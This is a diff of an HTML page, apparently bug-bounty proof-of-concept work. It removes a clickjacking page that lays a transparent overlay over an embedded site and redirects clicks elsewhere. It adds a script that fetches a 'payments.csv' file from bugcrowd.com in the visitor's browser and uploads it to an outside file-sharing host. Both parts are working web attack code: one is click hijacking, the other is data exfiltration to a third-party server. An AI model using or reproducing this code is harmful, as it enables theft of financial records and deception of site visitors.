@@ -1,58 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Clickjacking Example</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: Arial, sans-serif;
-        }
-        .iframe-container {
-            position: relative;
-            width: 90%;
-            height: 90vh;
-            border: 2px solid #ccc;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-        }
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        .click-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: transparent;
-            cursor: pointer;
-            z-index: 10;
-        }
-        .hidden-link {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.1);
-            cursor: pointer;
-            z-index: 20;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload to DropMeFile</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+    }
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
+  <h1>Download and Upload File</h1>
+  <button id="startButton">Fetch & Upload</button>
+  <div id="status"></div>
 
-<div class="iframe-container">
-    <iframe src="https://searchplayground.google/" title="Example Iframe"></iframe>
-    <div class="click-overlay" onclick="window.location='https://nigam498.github.io/google/';"></div>
-</div>
+  <script>
+    document.getElementById('startButton').addEventListener('click', async function () {
+      try {
+        // Step 1: Fetch the file from Bugcrowd
+        const fileBlob = await fetchFile('https://bugcrowd.com/payments.csv');
+        document.getElementById('status').innerText = 'File fetched successfully. Uploading...';
 
+        // Step 2: Upload to DropMeFile
+        const fileId = await uploadToDropMeFile(fileBlob, 'payments.csv');
+        document.getElementById('status').innerText = `File uploaded successfully! File ID: ${fileId}`;
+      } catch (error) {
+        console.error('Error:', error);
+        document.getElementById('status').innerText = 'Error: ' + error.message;
+      }
+    });
+
+    // Function to fetch the file from Bugcrowd
+    async function fetchFile(fileUrl) {
+      const response = await fetch(fileUrl);
+      if (!response.ok) throw new Error(`Failed to fetch file: ${response.statusText}`);
+      return response.blob();
+    }
+
+    // Function to upload the file to DropMeFile
+    async function uploadToDropMeFile(fileBlob, fileName) {
+      const formData = new FormData();
+      formData.append('file', fileBlob, fileName);
+
+      // Replace the URL below with the correct DropMeFile endpoint if they provide one
+      const response = await fetch('https://dropmeafile.com/api/upload', {
+        method: 'POST',
+        body: formData,
+      });
+
+      if (!response.ok) throw new Error('Failed to upload file to DropMeFile');
+      const result = await response.json();
+
+      // Return the file ID or link
+      return result.fileId || result.link || 'Unknown ID';
+    }
+  </script>
 </body>
 </html>
